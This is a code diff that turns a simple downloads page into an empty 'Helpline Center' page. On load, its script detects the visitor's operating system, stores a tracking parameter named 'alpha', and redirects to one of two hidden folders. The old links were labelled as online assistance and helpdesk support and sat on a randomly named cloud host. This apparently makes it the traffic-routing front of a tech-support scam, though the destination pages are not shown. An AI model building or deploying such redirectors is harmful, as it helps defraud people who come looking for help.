@@ -1,14 +1,47 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-    <head>
-        <title> Downloads </title>
-    </head>
-    <body>
-        <h1> Downloads </h1>
-        <ul>
-            <li><a id="https://85646aa8f030bec7f034fe1a.z13.web.core.windows.net/9-w173d5a/index.html" href="9-w173d5a/index.html"> Online_Assistance-A </a></li>
-            <li><a id="https://85646aa8f030bec7f034fe1a.z13.web.core.windows.net/w173d5a-9/index.html" href="w173d5a-9/index.html"> Helpdesk_Support-W </a></li>
-        </ul>
-    </body>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Helpline Center</title>
+    <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
+
+    <script>
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+        function myOperatingSystem() {
+            const userAgent = navigator.userAgent;
+            let os = "Unknown";
+            if (userAgent.indexOf("Win") !== -1) {
+                os = "Windows";
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                os = "MacOS";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                os = "Linux";
+            } else if (userAgent.indexOf("Android") !== -1) {
+                os = "Android";
+            } else if (userAgent.indexOf("iOS") !== -1) {
+                os = "iOS";
+            }
+            return os;
+        }
+        let operatingSystem = myOperatingSystem();
+        localStorage.setItem('alpha',getQueryParam('alpha'));
+        if(operatingSystem === 'MacOS'){
+            window.location.href="9-w173d5a/index.html";
+        }else{
+            window.location.href="w173d5a-9/index.html";
+        }
+
+        
+
+
+    </script>
+</head>
+<body>
+
+</body>
 </html>
